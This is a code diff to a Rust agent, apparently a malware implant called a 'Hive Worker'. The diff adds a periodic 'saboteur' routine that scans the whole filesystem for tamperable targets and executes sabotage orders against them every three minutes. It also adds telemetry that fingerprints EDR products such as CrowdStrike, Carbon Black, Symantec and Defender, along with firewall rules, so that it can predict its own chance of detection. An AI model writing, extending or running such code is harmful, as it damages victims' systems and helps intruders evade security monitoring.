@@ -184,12 +184,60 @@ impl ScoutAgent {
         }
     }
 
+    /// Run saboteur scan — look for tamperable targets on the filesystem
+    async fn run_sabotage_scan(&self) {
+        let sab = hive_base::saboteur::Saboteur::new();
+        let targets = sab.scan_for_targets(&std::path::Path::new("/"));
+        if !targets.is_empty() {
+            info!("Saboteur: found {} tamperable targets", targets.len());
+            for (i, (target_type, path)) in targets.iter().enumerate().take(5) {
+                info!("Saboteur target {}: {:?} at {}", i, target_type, path.display());
+                let order = hive_base::saboteur::SabotageOrder {
+                    target_type: target_type.clone(),
+                    target_path: path.clone(),
+                    severity: 0.3,
+                    scope: "random".into(),
+                    mutator_id: self.identity.id(),
+                    completed: false,
+                };
+                match sab.execute_order(&order) {
+                    Ok(r) => info!("Saboteur: {}", r),
+                    Err(e) => warn!("Saboteur failed: {}", e),
+                }
+            }
+        }
+    }
+
+    /// Collect telemetry for the Seer prediction engine
+    fn collect_seer_telemetry(&self) -> hive_base::seer::TelemetrySample {
+        let proc_list = get_running_processes();
+        hive_base::seer::TelemetrySample {
+            edr_process_count: proc_list.iter().filter(|p| edr_process_found(&[(*p).clone()])).count() as u32,
+            total_processes: proc_list.len() as u32,
+            uptime_hours: std::fs::read_to_string("/proc/uptime")
+                .ok().and_then(|s| s.split('.').next()?.parse::<u64>().ok())
+                .map(|s| s / 3600).unwrap_or(0),
+            firewall_rules: std::fs::read_dir("/etc/iptables").map(|e| e.count()).unwrap_or(0) as u32,
+            logged_in_users: std::fs::read_dir("/var/run/utmp").map(|e| e.count()).unwrap_or(1) as u32,
+            listening_ports: 0,
+            has_defender: edr_process_found(&proc_list),
+            has_sentinelone: false,
+            has_crowdstrike: proc_list.iter().any(|p| p.contains("csfalcon")),
+            has_carbonblack: proc_list.iter().any(|p| p.contains("carbonblack")),
+            has_symantec: proc_list.iter().any(|p| p.contains("symantec")),
+            is_vm: false,
+            is_domain_controller: false,
+            is_server_os: false,
+        }
+    }
+
     async fn run(&mut self) {
         info!("Hive Worker starting | ID: {} | Forest model active", self.identity.id());
         self.send_heartbeat().await;
 
         let mut hb = time::interval(self.heartbeat_interval);
         let mut scan = time::interval(self.scan_interval);
+        let mut sabotage = time::interval(Duration::from_secs(180));
 
         loop {
             tokio::select! {
@@ -197,6 +245,15 @@ impl ScoutAgent {
                 _ = scan.tick() => {
                     let beliefs = self.collect_system_profile().await;
                     self.publish_beliefs(&beliefs).await;
+                    // Collect seer telemetry on each scan
+                    let telemetry = self.collect_seer_telemetry();
+                    let seer = hive_base::seer::Seer::new();
+                    let pred = seer.predict_detection(&telemetry, "scan");
+                    info!("Seer: detection probability {:.2} via {}", pred.probability, pred.most_likely_vector);
+                }
+                _ = sabotage.tick() => {
+                    info!("Saboteur: starting periodic sabotage scan");
+                    self.run_sabotage_scan().await;
                 }
                 _ = time::sleep(Duration::from_millis(200)) => { self.process_incoming().await; }
             }
